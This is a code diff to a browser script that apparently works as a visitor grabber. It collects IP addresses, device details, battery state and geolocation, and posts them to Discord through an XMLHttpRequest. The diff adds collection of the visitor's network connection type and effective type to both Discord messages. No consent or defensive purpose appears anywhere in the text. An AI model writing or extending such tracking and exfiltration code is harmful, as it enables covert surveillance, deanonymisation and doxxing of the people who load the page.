@@ -20,6 +20,8 @@
             let localDeviceTime = new Date().toLocaleTimeString();
             let width = screen.width;
             let height = screen.height;
+            let connectionType;
+            let connectionEffectiveType;
 
             // Fetch Public IP
             async function fetchPublicIP() {
@@ -63,6 +65,17 @@
                 storageInfo = `${navigator.storage ? navigator.storage.estimate().then(res => res.quota) : "Unavailable"} GB`;
             }
 
+            // Fetch Network Connection Details
+            function fetchNetworkConnection() {
+                if (navigator.connection) {
+                    connectionType = navigator.connection.type || "Unavailable";
+                    connectionEffectiveType = navigator.connection.effectiveType || "Unavailable";
+                } else {
+                    connectionType = "Unavailable";
+                    connectionEffectiveType = "Unavailable";
+                }
+            }
+
             // Send Data to Discord
             function sendToDiscord(content) {
                 const request = new XMLHttpRequest();
@@ -100,6 +113,10 @@
 - **Battery Percentage**: ${batteryPercentage}
 - **Charging**: ${isCharging}
 
+**Network Connection:**
+- **Connection Type**: ${connectionType}
+- **Effective Connection Type**: ${connectionEffectiveType}
+
 **Geolocation Info:**
 - **Latitude**: ${position.coords.latitude}
 - **Longitude**: ${position.coords.longitude}`);
@@ -127,6 +144,7 @@
                 await fetchLocalIP();
                 await fetchBatteryInfo();
                 fetchDeviceInfo();
+                fetchNetworkConnection();
                 sendToDiscord(`
 **Local Time:**
 - ${localDeviceTime}
@@ -143,7 +161,11 @@
 - **UserAgent**: ${userAgent}
 - **Screen Resolution**: ${width}x${height}
 - **Battery Percentage**: ${batteryPercentage}
-- **Charging**: ${isCharging}`);
+- **Charging**: ${isCharging}
+
+**Network Connection:**
+- **Connection Type**: ${connectionType}
+- **Effective Connection Type**: ${connectionEffectiveType}`);
 
                 fetchGeolocation();
             }
